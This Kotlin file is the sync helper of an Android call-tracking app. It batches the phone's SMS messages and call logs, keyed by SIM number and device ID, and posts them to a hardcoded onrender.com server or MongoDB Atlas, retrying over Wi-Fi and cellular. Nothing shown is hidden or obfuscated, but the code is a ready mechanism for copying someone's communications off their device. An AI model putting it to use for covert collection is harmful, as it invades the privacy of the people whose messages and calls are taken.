package com.calltech

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Callable
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.TimeoutException

object MongoSyncHelper {
    private const val TAG = "MongoSyncHelper"
    private const val PREFS = "calltech_mongo"
    private const val KEY_API_BASE = "mongo_api_base"
    private const val LIVE_SYNC_API = "https://calltrack-e62l.onrender.com/api"
    private const val TIMEOUT_MS = 20000
    private const val BATCH_SIZE = 150

    @Volatile
    private var appContext: Context? = null
    private val httpExecutor = Executors.newCachedThreadPool()

    private fun isPublicHttps(url: String): Boolean {
        val value = url.trim().lowercase()
        return value.startsWith("https://") &&
            !value.contains("localhost") &&
            !value.contains("127.0.0.1")
    }

    private fun preferredApiUrl(): String {
        val fromBuild = BuildConfig.SYNC_API_URL.trim()
        return if (isPublicHttps(fromBuild)) fromBuild.trimEnd('/') else LIVE_SYNC_API
    }

    fun ensureApiUrl(context: Context) {
        val app = context.applicationContext
        appContext = app
        val preferred = preferredApiUrl()
        val current = getApiBaseUrl(app)
        if (current != preferred) {
            setApiBaseUrl(app, preferred)
            Log.d(TAG, "Sync API URL set to $preferred")
        }
    }

    private fun connectivity(): ConnectivityManager? {
        return appContext?.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
    }

    private fun networkLabel(cm: ConnectivityManager, network: Network): String {
        val caps = cm.getNetworkCapabilities(network) ?: return "net"
        return when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            else -> "net"
        }
    }

    private fun candidateNetworks(): List<Network> {
        val cm = connectivity() ?: return emptyList()
        val ordered = mutableListOf<Network>()

        fun addIf(network: Network?, predicate: (NetworkCapabilities) -> Boolean) {
            if (network == null || ordered.contains(network)) {
                return
            }
            val caps = cm.getNetworkCapabilities(network) ?: return
            if (predicate(caps)) {
                ordered.add(network)
            }
        }

        val all = try {
            cm.allNetworks
        } catch (_: Exception) {
            emptyArray()
        }
        all.forEach { network ->
            addIf(network) { caps ->
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) &&
                    caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            }
        }
        addIf(cm.activeNetwork) { caps ->
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
        }
        all.forEach { network ->
            addIf(network) { caps ->
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) &&
                    caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            }
        }
        addIf(cm.activeNetwork) { caps ->
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        }
        return ordered
    }

    private fun <T> runWithTimeout(label: String, block: () -> T): T? {
        val future = httpExecutor.submit(Callable { block() })
        return try {
            future.get(TIMEOUT_MS + 3000L, TimeUnit.MILLISECONDS)
        } catch (_: TimeoutException) {
            future.cancel(true)
            Log.e(TAG, "$label timed out")
            null
        } catch (error: Exception) {
            Log.e(TAG, "$label failed: ${error.message}")
            null
        }
    }

    fun isConfigured(context: Context): Boolean {
        if (AtlasDataApiSync.isConfigured()) {
            return true
        }
        if (AtlasDirectSync.isConfigured()) {
            return true
        }
        ensureApiUrl(context)
        return !getApiBaseUrl(context.applicationContext).isNullOrBlank()
    }

    private fun syncViaBestChannel(
        direct: () -> Boolean,
        dataApi: () -> Boolean,
        http: () -> Boolean,
    ): Boolean {
        if (http()) {
            return true
        }
        if (dataApi()) {
            Log.d(TAG, "Synced via Atlas Data API")
            return true
        }
        if (direct()) {
            Log.d(TAG, "Synced via Atlas Direct")
            return true
        }
        Log.w(TAG, "All sync channels failed")
        return false
    }

    fun forceApiUrl(context: Context, url: String) {
        appContext = context.applicationContext
        val incoming = url.trim()
        if (incoming.isBlank()) {
            return
        }

        val next = if (isPublicHttps(incoming)) incoming.trimEnd('/') else preferredApiUrl()
        setApiBaseUrl(context, next)
        Log.d(TAG, "Sync URL saved: $next")
    }

    fun postApi(context: Context, path: String, body: Map<String, Any>): Boolean {
        ensureApiUrl(context)
        val baseUrl = getApiBaseUrl(context.applicationContext) ?: preferredApiUrl()
        val suffix = if (path.startsWith("/")) path else "/$path"
        return postJson("$baseUrl$suffix", body)
    }

    fun setApiBaseUrl(context: Context, url: String) {
        val normalized = url.trim().trimEnd('/')
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putString(KEY_API_BASE, normalized)
            .commit()
    }

    fun getApiBaseUrl(context: Context): String? {
        return context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getString(KEY_API_BASE, null)
            ?.takeIf { it.isNotBlank() }
    }

    fun ping(context: Context, onComplete: ((Boolean) -> Unit)? = null) {
        BackgroundSyncRunner.run {
            if (AtlasDataApiSync.isConfigured()) {
                onComplete?.invoke(AtlasDataApiSync.ping())
                return@run
            }

            if (AtlasDirectSync.isConfigured()) {
                AtlasDirectSync.ping(onComplete)
                return@run
            }

            val baseUrl = getApiBaseUrl(context.applicationContext)
            if (baseUrl.isNullOrBlank()) {
                onComplete?.invoke(false)
                return@run
            }

            val ok = try {
                getJson("$baseUrl/health").optBoolean("ok", false)
            } catch (error: Exception) {
                Log.e(TAG, "ping failed: ${error.message}")
                false
            }
            onComplete?.invoke(ok)
        }
    }

    fun getStats(
        context: Context,
        onComplete: (success: Boolean, messageCount: Int, callCount: Int) -> Unit,
    ) {
        BackgroundSyncRunner.run {
            val appContext = context.applicationContext
            val simNumber = SimNumberHelper.getBestKnownSimNumber(appContext)

            if (AtlasDataApiSync.isConfigured()) {
                val (success, messages, calls) = AtlasDataApiSync.getStats(simNumber)
                onComplete(success, messages, calls)
                return@run
            }

            if (AtlasDirectSync.isConfigured()) {
                AtlasDirectSync.getStats(simNumber, onComplete)
                return@run
            }

            val baseUrl = getApiBaseUrl(appContext)
            if (baseUrl.isNullOrBlank()) {
                onComplete(false, 0, 0)
                return@run
            }

            try {
                val encodedSim = java.net.URLEncoder.encode(simNumber, "UTF-8")
                val response = getJson("$baseUrl/stats?simNumber=$encodedSim")
                onComplete(
                    response.optBoolean("success", false),
                    response.optInt("messageCount", 0),
                    response.optInt("callCount", 0),
                )
            } catch (error: Exception) {
                Log.e(TAG, "getStats failed: ${error.message}")
                onComplete(false, 0, 0)
            }
        }
    }

    fun syncMessagesNow(context: Context, messages: List<Map<String, Any>>): Boolean {
        if (messages.isEmpty()) {
            return true
        }

        ensureApiUrl(context)
        val appContext = context.applicationContext
        val baseUrl = getApiBaseUrl(appContext)
        val grouped = groupBySimNumber(appContext, messages) { ctx, item ->
            SyncDocumentHelper.enrichMessage(ctx, item)
        }

        var allSuccess = true
        grouped.forEach { (simNumber, batch) ->
            val ok = syncViaBestChannel(
                direct = {
                    val success = AtlasDirectSync.upsertMessages(simNumber, batch)
                    if (success) {
                        Log.d(TAG, "Messages synced direct to Atlas ($simNumber): ${batch.size}")
                    }
                    success
                },
                dataApi = {
                    val success = AtlasDataApiSync.upsertMessages(simNumber, batch)
                    if (success) {
                        Log.d(TAG, "Messages synced via Atlas Data API ($simNumber): ${batch.size}")
                    }
                    success
                },
                http = {
                    if (baseUrl.isNullOrBlank()) {
                        Log.e(TAG, "MongoDB sync OFF — server/.env me MONGODB_URI set karo aur app rebuild karo")
                        false
                    } else {
                        postInBatches(baseUrl, "messages", simNumber, batch).also { success ->
                            if (success) {
                                Log.d(TAG, "Messages synced ($simNumber): ${batch.size}")
                            }
                        }
                    }
                },
            )

            if (!ok) {
                allSuccess = false
            }
        }

        return allSuccess
    }

    fun syncCallLogsNow(context: Context, callLogs: List<Map<String, Any>>): Boolean {
        if (callLogs.isEmpty()) {
            return true
        }

        ensureApiUrl(context)
        val appContext = context.applicationContext
        val baseUrl = getApiBaseUrl(appContext)
        val grouped = groupBySimNumber(appContext, callLogs) { ctx, item ->
            SyncDocumentHelper.enrichCall(ctx, item)
        }

        var allSuccess = true
        grouped.forEach { (simNumber, batch) ->
            val collection = SimNumberHelper.callLogsCollection(simNumber)
            Log.d(TAG, "Syncing ${batch.size} calls -> $collection")
            val ok = syncViaBestChannel(
                direct = {
                    val success = AtlasDirectSync.upsertCallLogs(simNumber, batch)
                    if (success) {
                        Log.d(TAG, "Calls synced direct to Atlas ($simNumber): ${batch.size}")
                    }
                    success
                },
                dataApi = {
                    val success = AtlasDataApiSync.upsertCallLogs(simNumber, batch)
                    if (success) {
                        Log.d(TAG, "Calls synced via Atlas Data API ($simNumber): ${batch.size}")
                    }
                    success
                },
                http = {
                    if (baseUrl.isNullOrBlank()) {
                        Log.e(TAG, "MongoDB sync OFF — server/.env me MONGODB_URI set karo aur app rebuild karo")
                        false
                    } else {
                        postInBatches(baseUrl, "callLogs", simNumber, batch).also { success ->
                            if (success) {
                                Log.d(TAG, "Calls synced ($simNumber): ${batch.size}")
                            }
                        }
                    }
                },
            )

            if (!ok) {
                allSuccess = false
            }
        }

        return allSuccess
    }

    private fun groupBySimNumber(
        context: Context,
        items: List<Map<String, Any>>,
        enrich: (Context, Map<String, Any>) -> HashMap<String, Any>,
    ): Map<String, List<Map<String, Any>>> {
        return items
            .map { item ->
                val enriched = enrich(context, item)
                val simNumber = SimNumberHelper.resolveSimNumberFromItem(context, enriched)
                enriched["simNumber"] = simNumber
                enriched["syncStatus"] = "synced"
                enriched
            }
            .groupBy { item ->
                SimNumberHelper.resolveSimNumberFromItem(context, item)
            }
    }

    fun syncMessages(
        context: Context,
        messages: List<Map<String, Any>>,
        onComplete: ((Boolean) -> Unit)? = null,
    ) {
        if (messages.isEmpty()) {
            onComplete?.invoke(true)
            return
        }

        BackgroundSyncRunner.run {
            onComplete?.invoke(syncMessagesNow(context, messages))
        }
    }

    fun syncCallLogs(
        context: Context,
        callLogs: List<Map<String, Any>>,
        onComplete: ((Boolean) -> Unit)? = null,
    ) {
        if (callLogs.isEmpty()) {
            onComplete?.invoke(true)
            return
        }

        BackgroundSyncRunner.run {
            onComplete?.invoke(syncCallLogsNow(context, callLogs))
        }
    }

    private fun postInBatches(
        baseUrl: String,
        collectionKey: String,
        simNumber: String,
        items: List<Map<String, Any>>,
    ): Boolean {
        val path = if (collectionKey == "messages") "/messages/sync" else "/callLogs/sync"
        val key = if (collectionKey == "messages") "messages" else "callLogs"
        val deviceId = items.firstNotNullOfOrNull { item ->
            item["deviceId"]?.toString()?.takeIf { it.isNotBlank() }
        }.orEmpty()
        var allSuccess = true

        items.chunked(BATCH_SIZE).forEach { chunk ->
            if (!postJson(
                    "$baseUrl$path",
                    mapOf(
                        "deviceId" to deviceId,
                        "simNumber" to simNumber,
                        key to chunk,
                    ),
                )
            ) {
                allSuccess = false
            }
        }

        return allSuccess
    }

    private fun getJson(url: String): JSONObject {
        val networks = candidateNetworks().map { it as Network? } + null
        for (network in networks.distinct()) {
            val result = runWithTimeout("GET $url") {
                getJsonOnce(url, network)
            }
            if (result != null) {
                return result
            }
        }
        return JSONObject()
    }

    private fun openConnection(url: String, network: Network?): HttpURLConnection {
        val parsed = URL(url)
        return if (network != null) {
            network.openConnection(parsed) as HttpURLConnection
        } else {
            parsed.openConnection() as HttpURLConnection
        }
    }

    private fun getJsonOnce(url: String, network: Network?): JSONObject {
        var connection: HttpURLConnection? = null
        try {
            val label = network?.let { n ->
                connectivity()?.let { networkLabel(it, n) }
            } ?: "default"
            Log.d(TAG, "GET $url via $label")
            connection = openConnection(url, network).apply {
                requestMethod = "GET"
                connectTimeout = TIMEOUT_MS
                readTimeout = TIMEOUT_MS
            }
            val stream = if (connection.responseCode in 200..299) {
                connection.inputStream
            } else {
                connection.errorStream
            }
            val body = BufferedReader(InputStreamReader(stream)).use { it.readText() }
            return JSONObject(body.ifBlank { "{}" })
        } finally {
            connection?.disconnect()
        }
    }

    private fun postJson(url: String, body: Map<String, Any>): Boolean {
        val payload = mapToJsonObject(body).toString()
        val networks = candidateNetworks().map { it as Network? } + null
        for (network in networks.distinct()) {
            val result = runWithTimeout("POST $url") {
                postJsonOnce(url, payload, network)
            }
            if (result == true) {
                return true
            }
        }
        return false
    }

    private fun postJsonOnce(url: String, payload: String, network: Network?): Boolean {
        var connection: HttpURLConnection? = null
        val label = network?.let { n ->
            connectivity()?.let { networkLabel(it, n) }
        } ?: "default"
        return try {
            Log.d(TAG, "POST $url via $label")
            connection = openConnection(url, network).apply {
                requestMethod = "POST"
                connectTimeout = TIMEOUT_MS
                readTimeout = TIMEOUT_MS
                doOutput = true
                instanceFollowRedirects = true
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("Accept", "application/json")
            }
            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(payload)
                writer.flush()
            }
            val code = connection.responseCode
            val ok = code in 200..299
            if (ok) {
                Log.d(TAG, "POST $url via $label -> $code")
            } else {
                val errorBody = try {
                    BufferedReader(InputStreamReader(connection.errorStream ?: connection.inputStream)).use { it.readText() }
                } catch (_: Exception) {
                    ""
                }
                Log.e(TAG, "POST $url via $label -> $code $errorBody")
            }
            ok
        } catch (error: Exception) {
            Log.e(TAG, "POST failed ($url) via $label: ${error.message}")
            false
        } finally {
            connection?.disconnect()
        }
    }

    private fun mapToJsonObject(map: Map<String, Any>): JSONObject {
        val json = JSONObject()
        map.forEach { (key, value) ->
            json.put(key, toJsonValue(value))
        }
        return json
    }

    private fun toJsonValue(value: Any?): Any {
        return when (value) {
            null -> JSONObject.NULL
            is Map<*, *> -> {
                val nested = JSONObject()
                value.forEach { (key, nestedValue) ->
                    if (key is String) {
                        nested.put(key, toJsonValue(nestedValue))
                    }
                }
                nested
            }
            is List<*> -> {
                val array = JSONArray()
                value.forEach { item ->
                    array.put(toJsonValue(item))
                }
                array
            }
            else -> value
        }
    }
}
